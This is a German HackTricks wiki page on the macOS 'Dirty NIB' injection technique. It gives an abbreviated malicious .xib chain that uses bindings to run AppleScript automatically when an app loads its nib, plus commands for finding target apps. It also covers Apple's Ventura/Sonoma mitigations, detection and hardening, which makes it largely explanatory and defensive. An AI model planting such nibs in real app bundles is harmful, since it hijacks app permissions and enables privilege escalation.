# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB bezeichnet den Missbrauch von Interface Builder Dateien (.xib/.nib) innerhalb eines signierten macOS App‑Bundles, um vom Angreifer kontrollierte Logik im Zielprozess auszuführen und damit dessen Entitlements und TCC‑Berechtigungen zu erben. Diese Technik wurde ursprünglich von xpn (MDSec) dokumentiert und später von Sector7 generalisiert und deutlich erweitert; sie behandeln auch Apples Gegenmaßnahmen in macOS 13 Ventura und macOS 14 Sonoma. Für Hintergrund und tiefere Analysen siehe die Referenzen am Ende.

> TL;DR
> • Vor macOS 13 Ventura: das Ersetzen von MainMenu.nib eines Bundles (oder einer anderen beim Start geladenen nib) konnte zuverlässig Prozessinjektion und häufig privilege escalation erreichen.
> > • Seit macOS 13 (Ventura) und weiter verbessert in macOS 14 (Sonoma): first‑launch deep verification, bundle protection, Launch Constraints und die neue TCC „App Management“ Berechtigung verhindern größtenteils nachträgliches Manipulieren von nibs durch nicht verwandte Apps. Angriffe können in Nischenfällen weiterhin möglich sein (z. B. Werkzeuge desselben Entwicklers, die eigene Apps modifizieren, oder Terminals, denen der Benutzer App Management/Full Disk Access gewährt hat).

## Was sind NIB/XIB-Dateien

Nib (Kurzform von NeXT Interface Builder) Dateien sind serialisierte UI‑Objektgraphen, die von AppKit‑Apps verwendet werden. Modernes Xcode speichert editierbare XML .xib Dateien, die zur Build‑Zeit in .nib kompiliert werden. Eine typische App lädt ihre Haupt‑UI über `NSApplicationMain()`, welche den `NSMainNibFile` Key aus der Info.plist der App liest und den Objektgraphen zur Laufzeit instanziiert.

Wichtige Punkte, die den Angriff ermöglichen:
- Das Laden von NIBs instanziiert beliebige Objective‑C Klassen, ohne dass diese NSSecureCoding implementieren müssen (Apples nib loader fällt auf `init`/`initWithFrame:` zurück, wenn `initWithCoder:` nicht vorhanden ist).
- Cocoa Bindings können missbraucht werden, um Methoden beim Instanziieren von nibs aufzurufen, einschließlich verketteter Aufrufe, die keine Benutzerinteraktion erfordern.

## Dirty NIB Injektionsprozess (Angreiferansicht)

Der klassische Vor‑Ventura Ablauf:
1) Create a malicious .xib
- Füge ein `NSAppleScript` Objekt hinzu (oder andere „gadget“ Klassen wie `NSTask`).
- Füge ein `NSTextField` hinzu, dessen title die payload enthält (z. B. AppleScript oder Befehlsargumente).
- Füge ein oder mehrere `NSMenuItem` Objekte hinzu, die über Bindings verdrahtet sind, um Methoden am Zielobjekt aufzurufen.

2) Auto‑trigger without user clicks
- Verwende Bindings, um target/selector eines Menu‑Items zu setzen und rufe dann die private `_corePerformAction` Methode auf, sodass die Aktion automatisch ausgelöst wird, wenn die nib geladen wird. Das erspart einen Benutzerklick auf einen Button.

Minimalbeispiel einer Auto‑Trigger‑Kette innerhalb einer .xib (gekürzt zur Übersicht):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Dies ermöglicht die beliebige Ausführung von AppleScript im Zielprozess beim Laden des nib. Fortgeschrittene Ketten können:
- Beliebige AppKit-Klassen instanziieren (z. B. `NSTask`) und Methoden ohne Argumente wie `-launch` aufrufen.
- Beliebige Selector mit Objektargumenten über den oben beschriebenen Binding-Trick aufrufen.
- AppleScriptObjC.framework laden, um in Objective‑C zu bridgen und sogar ausgewählte C-APIs aufzurufen.
- Auf älteren Systemen, die noch Python.framework enthalten, in Python bridgen und dann `ctypes` verwenden, um beliebige C-Funktionen aufzurufen (Forschung von Sector7).

3) Das nib der App ersetzen
- Kopiere target.app an einen beschreibbaren Ort, ersetze z. B. `Contents/Resources/MainMenu.nib` durch das bösartige nib, und starte target.app. Pre‑Ventura wurde nach einer einmaligen Gatekeeper‑Prüfung bei nachfolgenden Starts nur eine oberflächliche Signaturprüfung durchgeführt, sodass nicht‑ausführbare Ressourcen (wie .nib) nicht erneut validiert wurden.

Beispiel AppleScript payload für einen sichtbaren Test:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Moderne macOS‑Schutzmaßnahmen (Ventura/Monterey/Sonoma/Sequoia)

Apple führte mehrere systemweite Schutzmaßnahmen ein, die die Anwendbarkeit von Dirty NIB in modernem macOS drastisch reduzieren:
- Tiefgehende Verifikation beim ersten Start und Bundle‑Schutz (macOS 13 Ventura)
- Beim ersten Start einer App (quarantiniert oder nicht) deckt eine tiefgehende Signaturprüfung alle Ressourcen des Bundles ab. Danach wird das Bundle geschützt: Nur Apps desselben Entwicklers (oder ausdrücklich von der App erlaubt) dürfen dessen Inhalt ändern. Andere Apps benötigen die neue TCC „App Management“-Berechtigung, um in das Bundle einer anderen App schreiben zu dürfen.
- Launch Constraints (macOS 13 Ventura)
- System/Apple‑bundled apps können nicht kopiert und aus anderen Orten gestartet werden; das macht den „copy to /tmp, patch, run“-Ansatz für OS‑Apps unmöglich.
- Verbesserungen in macOS 14 Sonoma
- Apple hat App Management gehärtet und bekannte Bypasses (z. B. CVE‑2023‑40450) behoben, die von Sector7 dokumentiert wurden. Python.framework wurde bereits früher (macOS 12.3) entfernt, wodurch einige privilege‑escalation chains unterbrochen wurden.
- Gatekeeper/Quarantine changes
- Für eine ausführlichere Diskussion zu Gatekeeper-, provenance- und assessment‑Änderungen, die diese Technik beeinflusst haben, siehe die unten referenzierte Seite.

> Praktische Auswirkungen
> • Unter Ventura+ können Sie in der Regel die .nib einer Drittanbieter‑App nicht ändern, es sei denn, Ihr Prozess verfügt über App Management oder ist mit derselben Team ID wie das Ziel signiert (z. B. Entwicklertools).
> • Das Gewähren von App Management oder Full Disk Access an shells/terminals öffnet diese Angriffsfläche effektiv wieder für alles, was Code im Kontext dieses Terminals ausführen kann.


### Umgang mit Launch Constraints

Launch Constraints verhindern seit Ventura, dass viele Apple‑Apps aus nicht‑standardmäßigen Orten gestartet werden. Wenn Sie auf pre‑Ventura‑Workflows angewiesen waren, wie das Kopieren einer Apple‑App in ein temporäres Verzeichnis, das Modifizieren von `MainMenu.nib` und das Starten der App, rechnen Sie damit, dass dies auf macOS >= 13.0 fehlschlägt.


## Auflisten von Zielen und nibs (nützlich für Forschung / Legacy‑Systeme)

- Finde Apps, deren UI nib‑driven ist:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Finde Kandidaten für nib-Ressourcen innerhalb eines Bundles:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Code-Signaturen gründlich validieren (scheitert, wenn du Ressourcen manipuliert und nicht neu signiert hast):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Hinweis: Auf modernen macOS wirst du außerdem durch bundle protection/TCC blockiert, wenn du versuchst, ohne entsprechende Autorisierung in das Bundle einer anderen App zu schreiben.


## Erkennung und DFIR‑Tipps

- Datei‑Integritätsüberwachung für Bundle‑Ressourcen
- Achte auf mtime/ctime‑Änderungen an `Contents/Resources/*.nib` und anderen nicht‑ausführbaren Ressourcen in installierten Apps.
- Unified Logs und Prozessverhalten
- Überwache unerwartete AppleScript‑Ausführung in GUI‑Apps und Prozesse, die AppleScriptObjC oder Python.framework laden. Beispiel:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Proaktive Überprüfungen
- Führe regelmäßig `codesign --verify --deep` für kritische Apps aus, um sicherzustellen, dass Ressourcen intakt bleiben.
- Privilegienkontext
- Prüfe, wer/was TCC „App Management“ oder Full Disk Access hat (insbesondere Terminals und Management‑Agenten). Das Entfernen dieser Rechte aus allgemeinen Shells verhindert, dass Dirty NIB‑style Manipulationen trivial wieder aktiviert werden.


## Defensive Härtung (Entwickler und Verteidiger)

- Bevorzuge programmatische UI oder beschränke, was aus nibs instanziiert wird. Vermeide das Einbinden mächtiger Klassen (z. B. `NSTask`) in nib‑Graphen und vermeide Bindings, die Selektoren indirekt auf beliebigen Objekten aufrufen.
- Nutze den hardened runtime mit Library Validation (bereits Standard für moderne Apps). Das verhindert zwar nicht allein nib‑injection, blockiert aber einfaches Laden nativen Codes und zwingt Angreifer zu reinen Skript‑Payloads.
- Fordere in allgemeinen Tools keine umfassenden App Management‑Berechtigungen an und verlasse dich nicht darauf. Wenn MDM App Management benötigt, trenne diesen Kontext von benutzergetriebenen Shells.
- Überprüfe regelmäßig die Integrität deines App‑Bundles und sorge dafür, dass deine Update‑Mechanismen Bundle‑Ressourcen selbst heilen.


## Weiterführende Lektüre in HackTricks

Erfahre mehr über Gatekeeper, quarantine und provenance‑Änderungen, die diese Technik beeinflussen:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## Referenzen

- xpn – DirtyNIB (ursprüngliche Beschreibung mit Pages‑Beispiel): https://blog.xpnsec.com/dirtynib/
- Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (April 5, 2024): https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/

{{#include ../../../banners/hacktricks-training.md}}
